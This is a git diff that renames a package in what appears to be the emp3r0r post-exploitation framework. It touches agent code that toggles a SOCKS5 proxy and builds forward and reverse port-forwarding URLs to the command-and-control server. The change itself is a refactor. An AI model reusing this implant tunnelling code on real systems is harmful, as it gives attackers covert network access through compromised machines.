@@ -11,7 +11,7 @@ import (
 	"sync"
 	"time"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/posener/h2conn"
 )
@@ -40,21 +40,21 @@ func Socks5Proxy(op string, addr string) (err error) {
 	case "on":
 		log.Printf("Starting Socks5Proxy %s", addr)
 		go func() {
-			err = tun.StartSocks5Proxy(addr, RuntimeConfig.DoHServer, emp3r0r_data.ProxyServer)
+			err = tun.StartSocks5Proxy(addr, RuntimeConfig.DoHServer, emp3r0r_def.ProxyServer)
 			if err != nil {
 				log.Printf("StartSock5Proxy %s: %v", addr, err)
 			}
 		}()
 	case "off":
 		log.Printf("Stopping Socks5Proxy %s", addr)
-		if emp3r0r_data.ProxyServer == nil {
+		if emp3r0r_def.ProxyServer == nil {
 			return errors.New("proxy server is not running")
 		}
-		err = emp3r0r_data.ProxyServer.Shutdown()
+		err = emp3r0r_def.ProxyServer.Shutdown()
 		if err != nil {
 			log.Print(err)
 		}
-		emp3r0r_data.ProxyServer = nil
+		emp3r0r_def.ProxyServer = nil
 	default:
 		return errors.New("operation not supported")
 	}
@@ -80,7 +80,7 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 		session PortFwdSession
 
 		url = fmt.Sprintf("%s%s/%s",
-			emp3r0r_data.CCAddress,
+			emp3r0r_def.CCAddress,
 			tun.ProxyAPI,
 			sessionID)
 
@@ -149,7 +149,7 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
 		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
 		url := fmt.Sprintf("%s%s/%s",
-			emp3r0r_data.CCAddress,
+			emp3r0r_def.CCAddress,
 			tun.ProxyAPI,
 			shID)
 
